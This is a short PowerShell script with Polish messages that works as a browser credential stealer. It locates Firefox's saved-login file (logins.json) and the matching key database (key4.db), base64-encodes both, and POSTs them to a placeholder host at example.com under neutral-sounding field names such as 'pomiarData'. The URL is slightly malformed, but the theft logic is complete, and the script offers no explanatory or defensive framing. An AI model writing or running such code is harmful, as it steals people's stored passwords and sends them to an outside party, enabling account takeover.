$filePath = Get-ChildItem -Path C:\ -Recurse -Filter logins.json -ErrorAction SilentlyContinue -Force | Select-Object -First 1 -ExpandProperty FullName
if ($filePath -eq $null) {
    Write-Error "Nie znaleziono pliku."
    exit
}
$contentPomiar = [Convert]::ToBase64String([IO.File]::ReadAllBytes($filePath))
$directory = Split-Path -Path $filePath
$dataFilePath = Join-Path -Path $directory -ChildPath "key4.db"
$contentData = [Convert]::ToBase64String([IO.File]::ReadAllBytes($dataFilePath))
$url = "http:/example.com/odbierz"
$body = @{
    pomiarData = $contentPomiar
    dataData = $contentData
} | ConvertTo-Json
Invoke-RestMethod -Uri $url -Method Post -Body $body -ContentType "application/json"
